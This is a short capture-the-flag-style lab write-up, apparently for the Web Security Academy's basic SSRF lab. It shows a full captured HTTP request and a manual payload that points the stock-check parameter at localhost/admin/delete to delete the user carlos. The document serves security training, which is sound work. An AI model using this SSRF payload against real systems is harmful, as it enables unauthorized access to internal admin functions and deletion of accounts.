## Lab: Basic SSRF against the local server

Description:

-  This lab has a stock check feature which fetches data from an internal system.

- To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. 

```
POST /product/stock HTTP/2
Host: 0a5c00d8033c493280eeb358005a009d.web-security-academy.net
Cookie: session=39gyD0rQ3PAO3Dqdej1DTruzprAjgfWz
Content-Length: 54
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a5c00d8033c493280eeb358005a009d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a5c00d8033c493280eeb358005a009d.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost/admin/delete?username=carlos
```

Manual Payload:

```
stockApi=http://localhost/admin/delete?username=carlos
```